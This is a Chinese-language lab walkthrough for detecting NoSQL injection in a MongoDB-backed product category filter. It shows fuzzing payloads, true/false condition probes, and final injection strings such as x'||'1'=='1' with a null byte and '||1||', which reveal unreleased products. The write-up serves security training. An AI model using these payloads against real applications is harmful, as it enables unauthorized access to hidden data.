# 实验：检测 NoSQL 注入

本实验的产品类别过滤器由 MongoDB NoSQL 数据库提供支持。它存在 NoSQL 注入漏洞。

为了解决本实验，请执行一次 NoSQL 注入攻击，使应用程序显示未发布的产品。

## 步骤

探测
- 使用产品类别功能
    ```http
    GET /filter?category=Gifts HTTP/2
    ```
    - 服务器响应
        ```html
        <h1>
            Gifts
        </h1>
        ```

- 提交模糊测试载荷
    ```
    <@urlencode>'"`{
    ;$Foo}
    $Foo \xYZ</@urlencode>
    ```
    - 服务器响应
        ```log
        Command failed with error 139 (JSInterpreterFailure): 'SyntaxError: unterminated string literal :
        functionExpressionParser@src/mongo/scripting/mozjs/mongohelpers.js:46:25
        ' on server 127.0.0.1:27017. The full response is {"ok": 0.0, "errmsg": "SyntaxError: unterminated string literal :\nfunctionExpressionParser@src/mongo/scripting/mozjs/mongohelpers.js:46:25\n", "code": 139, "codeName": "JSInterpreterFailure"}
        ```
        - 揭示 mongo

- 测试条件
    - 假
        ```
        Gifts<@urlencode>' && 0 && 'x</@urlencode>
        ```
        - 服务器响应不匹配任何商品
    - 真
        ```
        Gifts<@urlencode>' && 1 && 'x</@urlencode>
        ```
        - 服务器响应应用 Gifts 过滤条件
    
    - 存在条件差异

最终载荷
`category=<@urlencode>x'||'1'=='1'</@urlencode>%00`
- 设置条件为真，且使用空字节截断原查询末尾的限制

- 成功返回隐藏商品

示例解决方案
- 载荷
    `'||1||'`
    - 并非尝试使用空字节截断后续限制，而是使用第二个 `||` 使得后续语句不被评估
